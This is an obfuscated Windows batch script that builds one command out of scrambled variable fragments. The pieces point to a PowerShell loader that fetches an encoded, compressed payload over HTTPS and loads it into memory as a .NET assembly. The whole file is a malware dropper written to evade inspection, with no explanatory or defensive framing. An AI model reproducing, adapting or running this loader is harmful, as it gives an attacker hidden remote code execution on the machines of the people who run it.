@echo off
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "qMCAIFtYJn=AhKn"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "GuThkhMZwN=$ep="
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "CCGxTpjDdm=r=$m"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "RqoTSbmyek=ithu"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "vvUwTAVJHp=ads="
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "fSahSxBbLB= $ur"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "hKbBREtHdc=IO.C"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "fDctdqhUgz=ng($"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "MIPBrLjdbh=ay()"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "ivoheqCrCX=null"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "pTnOGnYTiR=func"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "EIPKYvgwON=de]:"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "CWgYMItmQd=$pay"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "yDCkTnckvu=$a.C"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "xwCzNrXHTb=fs/h"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "VsirXurThK=yloa"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "dFLKVtdcOC=rySt"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "jysRuVPZSr=ess)"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "JWZZOvfZth=$p);"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "wMCuPJzyDv=,'A'"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "LrVxrLQjyf=nsfo"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "AleCeeaGCL=Memo"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "CxvdZhVddo=$msi"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "JHxgRHpvqA=$p){"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "UNLIDdQlbD=gth)"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "jUAcXuRVtO=Secu"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "bNwIezofFG=eDud"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "FvWWkmilkZ={$a="
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "LXzmHDDRlK=ell."
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "yiZrglZDGP=se()"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "cljhpCeIHy=vert"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "TaQsqYBXEq=ert]"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "RQDGvJFKSr=p,$p"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "vFCWSRiDRh=emor"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "oiuIOTlUWV=-Obj"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "NgtLlYPDQd=[Sys"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "HzrYsrIrTe=Conv"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "ojRctscVSL=ompr"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "prqyPWpzrN=,$p)"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "YtBGbyvDka=Requ"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "yoOAjtCPXL=/mai"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "vYmvTVIskq=e();"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "dlzAtgAxoa=-Web"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "DLiArUAnGs=);$g"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "zWpePlWYxj=dows"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "oHTwhPexmx=g/re"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "KNMATNkmIL=[1]."
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "nSNQdRrttc=mbly"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "bfoOGyYfLg=,$p2"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "wNyWLmjnYC=0,$p"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "LGFxxqnXeB=('@'"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "yziHzOdFiS=nalB"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "heGBcHKsLy=ttps"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "bDpuVDgTQk=on.G"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "lXQKTSFXEs=s]::"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "algkALsqPY=omBa"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "DQLnRnKUuL=tion"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "VvWkJwwvGJ=e();"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "NkKfbJcMBI=ndow"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "yVUTOgmtZj=nt.T"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "kIFNosCIPc=eDec"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "FqTIXkngYv=;$ms"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "rtwsvtRekr=.Rep"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "kMnYxdSFMd=s[0]"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "OnMITrnavn=';$a"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "cMafaQUQaK==[Co"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "RRGiNkbWUE=ell\"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "XcImtzfpcH=$mso"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "JEwINliAsa=;$gs"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "NBGiRRlipC=ncti"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "VACxpYQfZe=$pl2"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "zJzNGidzih=;$a."
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "RCRtedfNpo=[byt"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "OxYMvMWAGk=so.T"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "mTiiMYVBCA=A=')"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "aoWDNSnCzq=');$"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "NjqmvRyori=buse"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "LuuteOFhcf=$dec"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "AsbVcpaycw=rcon"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "hfGUSldYZF=C';$"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "sPUDgwyRnN=);$p"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "mDSaHjsxkT=gL4S"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "HzbGhiGmIy=pl1="
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "YlpCTBWFYK=2){$"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "NiMupUkGlj=v/Pr"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "KenshDPnUd==New"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "ZstxGPhOyr=RoYl"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "RLxmZBlOgi=]::F"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "JaZjEHOUFB=g).C"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "ZDMMjWPmSL=yStr"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "IBZTDAqjGk=-Obj"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "vLsqEeUYuW=.Rep"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "aWiAIvsAas=lace"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "EEKRMQalvp=essi"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "XQSFzFqxmM=ddin"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "gjtZIDvpQn=o.Di"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "zrOhByqhKy=ivat"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "gTEOWNDmXO=e-de"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "JokMRImoWm=w-Ob"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "iFWXEdKcwj=yTo("
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "KEtBRVSyfC=]::L"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "lJphpZEyQE=l2=z"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "PiKhRcSvmQ=t';$"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "TDseeNTtQK=sPow"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "dVRZPKTYns='#',"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "kqwfydOlfh=essi"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "BPiVvPyvhq=2\Wi"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "mMPOXoBRMH=.com"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "atoKXbniyI=nver"
%EssemerUua%%fSahSxBbLB%%QYRWHMnaGA%%heGBcHKsLy%%fYzCEylUZK%%xSehzGBvxz%%RqoTSbmyek%%NjqmvRyori%%AsbVcpaycw%%goUlHOKFKD%%mMPOXoBRMH%%hmeoZypsQD%%bNwIezofFG%%gTEOWNDmXO%%NiMupUkGlj%%zrOhByqhKy%%avlfBnHprl%%UcvcPSacsk%%oHTwhPexmx%%xwCzNrXHTb%%mUpaowWMrJ%%yoOAjtCPXL%%jkcTOxAVoy%%VsirXurThK%%SrgDZjIcqu%%PiKhRcSvmQ%%WaxTNffwCP%%bIHmSRdyUF%%PxFTINIbzV%%BWHrORTmPT%%dlzAtgAxoa%%YtBGbyvDka%%xeXHneaqyb%%XRJbBEXeAB%%mkMzXivaqp%%wpcOvZnSno%%gkZnchKAfw%%BqdIOmryJe%%JaZjEHOUFB%%qeRmvblzwP%%yVUTOgmtZj%%IPiiEflQJu%%sPUDgwyRnN%%aRbUGOfguy%%vvUwTAVJHp%%QvQcxIaqNs%%HvfmiROoBP%%aevkZXVyKF%%APjXXFbZwX%%OOtcRZpInb%%MHhRpLaFcA%%NBGiRRlipC%%QORDblLttZ%%HmkISTHrHm%%FvWWkmilkZ%%NgtLlYPDQd%%ZHlcSArXpY%%jUAcXuRVtO%%dAiumATzwU%%deAEmXjUeJ%%VlVlPTGqNR%%gUjcayyRQr%%GSAvUftWQZ%%lXQKTSFXEs%%UDMFNjUyDN%%zrdNcdKzqK%%zJzNGidzih%%TBmxwdfUHK%%kUscATTdHQ%%hfGUSldYZF%%gvqvUXeGqZ%%XQSFzFqxmM%%paRsaOVsFl%%ZhVcEPEXiC%%OnMITrnavn%%UGMmqfEXvf%%cMafaQUQaK%%atoKXbniyI%%BUXrqsuIMy%%kGBczbmHId%%wwZKnBsboo%%SvzMEiPJOI%%vmdBztSlkW%%PGAvmeVmeP%%ZstxGPhOyr%%mDSaHjsxkT%%JhRszmUdAA%%mDEZIcTGVK%%ldNSJlNAOc%%LxblgSBaYu%%UeoXfJYTrF%%qMCAIFtYJn%%yuoyPOBtTP%%ATIAQgPPNa%%mTiiMYVBCA%%zCrKWzPPiq%%hFaCexebJB%%QDlIbElgLR%%TaQsqYBXEq%%rZHxSHTGeo%%TTRbKVqIJr%%oJdrwhOHmg%%VgxskQWOQu%%KFcxXZjOIu%%HTomcHVqaL%%SmtXtNwyRT%%ZCSoGJHGtx%%YaYRycRkqC%%VFNeByleej%%DKXOveaZGt%%aoWDNSnCzq%%VlipYtONNi%%yDCkTnckvu%%bREXCGIkrJ%%kIFNosCIPc%%pmmxUxMMJz%%PdhfpdGkMs%%LEwdYPYOWB%%LuuteOFhcf%%TWARUgBzyk%%LrVxrLQjyf%%yXQiOuJNbB%%yziHzOdFiS%%oyqLPtzWcs%%YvIWGVgrcA%%wNyWLmjnYC%%HkaGRaHetv%%UNLIDdQlbD%%IMCIvAZtaC%%klYAKNubfF%%obXHFJcQtI%%vYmvTVIskq%%bneRkIOlXP%%IPfvoGOUcM%%yiZrglZDGP%%ecQPEbXgwW%%UQSEaGSRgm%%hOpySSnMKZ%%JlEiLFYqRn%%JHxgRHpvqA%%tiwuHqMsWL%%NlwxnJmKTu%%IBZTDAqjGk%%CRvjFBOjAu%%TFtfzykZTi%%vFCWSRiDRh%%ZDMMjWPmSL%%VcjyBciUtf%%prqyPWpzrN%%skstuqTHWD%%IYghnswdvP%%JokMRImoWm%%HpUesKKPek%%jAYQwrkjlx%%AleCeeaGCL%%dFLKVtdcOC%%IGZkGiqtqz%%yddzLwlsan%%KenshDPnUd%%oiuIOTlUWV%%OHpcnaClYz%%hKbBREtHdc%%tcynlqJuKR%%kqwfydOlfh%%bDpuVDgTQk%%AERTBMicQW%%qiBhpQoWcO%%QiBWbPMdsI%%jQDAqGzCDM%%ULuiQTcife%%ojRctscVSL%%ZeKiNAEaQI%%rMtqTeOtfh%%NEYntZZBgY%%EEKRMQalvp%%ocsxNCQAip%%EIPKYvgwON%%BdTReMcBDd%%dCYQSLmBAR%%jysRuVPZSr%%JEwINliAsa%%ApXflbKYRn%%iFWXEdKcwj%%XcImtzfpcH%%DLiArUAnGs%%kQhFieHzeK%%AgdjcxGKML%%VvWkJwwvGJ%%CxvdZhVddo%%SGlsgxIZxT%%oQAVxOUXVM%%HlSuhcKajV%%CCGxTpjDdm%%OxYMvMWAGk%%nYhrHGORld%%MIPBrLjdbh%%FqTIXkngYv%%gjtZIDvpQn%%BssaAgHwuK%%DTyyEWfytw%%sHTQXCoQTO%%pTnOGnYTiR%%DQLnRnKUuL%%yXVtUTyCcX%%RQDGvJFKSr%%YlpCTBWFYK%%RuwhpsXTUN%%OwQlZMneRi%%HaccNmHtAs%%WTDsfxuvrd%%LLQeDBveCg%%nSNQdRrttc%%KEtBRVSyfC%%sSMOwVkXzm%%RCRtedfNpo%%fabpshsonH%%JWZZOvfZth%%GuThkhMZwN%%QejQxrQxwp%%CVKRCVDRFJ%%YfuhILhTek%%usSAREMiCx%%EHCdEKJbFp%%EVuMOKKciL%%kXtlVjckaY%%ivoheqCrCX%%bfoOGyYfLg%%UKZRnHorhu%%HzbGhiGmIy%%hszlKeIEFw%%lXzTexwxUx%%cljhpCeIHy%%RLxmZBlOgi%%YJLLjKZhBJ%%LjskvVjrVh%%aaWhEAzmUD%%lIqMysAyYF%%CWgYMItmQd%%rUSZhYMEgI%%kMnYxdSFMd%%vLsqEeUYuW%%hnvQlrQrFA%%GVsquPJhAI%%PNANIGBBud%%eOjjBXrxMf%%nBamwzscWO%%uMyMgtMIhF%%QoWBvSLiOw%%ymvuvoMnqi%%nzFFIrpxch%%lJphpZEyQE%%NknAqirdqS%%HzrYsrIrTe%%CofHlPWnev%%KnxMudlfpA%%algkALsqPY%%qmFMczeGoA%%ldZUhtbEDo%%fDctdqhUgz%%xGygfxHLJV%%YEQOoWmldh%%KNMATNkmIL%%rjAPcEESPK%%LqVIqBNneh%%dVRZPKTYns%%nvcXDPeaLJ%%rtwsvtRekr%%aWiAIvsAas%%LGFxxqnXeB%%wMCuPJzyDv%%SPOVrqmCph%%wDatYLNYVf%%gUZJVnuNLY%%WTXEzVRKfg%%dLHXeTLiwd%%VACxpYQfZe%%VzQrlDGvTd%%TcTPcumbFc%%BlrHcvqzpB%%eMLbkDVqMA%%mqptjSHNvV%%LOzXCKiioP%%mhgrYgrSEz%%zWpePlWYxj%%ODeuQqmNzA%%vMcWnfkXud%%BPiVvPyvhq%%NkKfbJcMBI%%TDseeNTtQK%%bZDuIYuiYa%%RRGiNkbWUE%%cyvMjXweRI%%VeExpOGqwd%%pUNAQcXkqT%%LXzmHDDRlK%%CpqpfMmiTY%
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "onLirjjkbQ= /b"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "dnwQrizSIa=exit"
%dnwQrizSIa%%onLirjjkbQ%
